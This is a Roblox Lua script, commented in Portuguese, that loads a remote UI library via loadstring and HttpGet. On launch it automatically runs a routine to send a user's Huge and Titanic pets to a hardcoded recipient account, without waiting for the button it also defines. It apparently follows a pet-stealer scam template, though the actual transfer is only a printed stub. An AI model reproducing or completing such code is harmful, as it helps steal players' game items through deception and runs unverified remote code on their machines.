local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/kwargs_Ui_Library/main/source.lua"))()

local UI = Lib:Create{
   Theme = "Dark", -- ou qualquer outro tema
   Size = UDim2.new(0, 555, 0, 400) -- padrão
}

local Main = UI:Tab{
   Name = "Main"
}

local Divider = Main:Divider{
   Name = "Main shit"
}

local QuitDivider = Main:Divider{
   Name = "Quit"
}

local playerName = "slenderman_510"  -- Nome da conta destinatária
local hugePets = {"Huge Red Wolf", "Huge Player Fox"}  -- Lista dos huge pets a serem enviados
local titanicPets = {"Titanic Pet 1", "Titanic Pet 2"}  -- Lista dos pets Titanic a serem enviados

-- Função para enviar um pet pela mailbox
function sendPetToMailbox(player, pet)
    print("Enviando " .. pet .. " para " .. player)
    -- Código para enviar o pet pela mailbox vai aqui
    -- Simulação do envio:
    wait(1)
    print(pet .. " foi enviado para " .. player .. " com sucesso!")
end

-- Função para enviar todos os pets da lista pela mailbox
function sendAllPets(player, pets)
    for _, pet in ipairs(pets) do
        sendPetToMailbox(player, pet)
    end
end

-- Função principal para enviar os Huge e Titanic pets
function sendHugeAndTitanicPets()
    print("Iniciando envio dos Huge e Titanic pets...")
    sendAllPets(playerName, hugePets)
    sendAllPets(playerName, titanicPets)
    print("Todos os pets foram enviados!")
end

-- Adicionando uma label para exibir o status
local statusLabel = Main:Label{
    Name = "Status: Pronto para enviar os pets",
    Text = "Status: Pronto para enviar os pets"
}

-- Botão para enviar os Huge e Titanic pets
local sendPetsButton = Main:Button{
    Name = "Enviar Huge e Titanic Pets",
    Callback = function()
        statusLabel:Set("Status: Enviando pets...")
        sendHugeAndTitanicPets()
        statusLabel:Set("Status: Todos os pets foram enviados!")
    end
}

-- Chamando a função principal ao executar o script
statusLabel:Set("Status: Enviando pets automaticamente ao iniciar o script...")
sendHugeAndTitanicPets()
statusLabel:Set("Status: Todos os pets foram enviados automaticamente!")

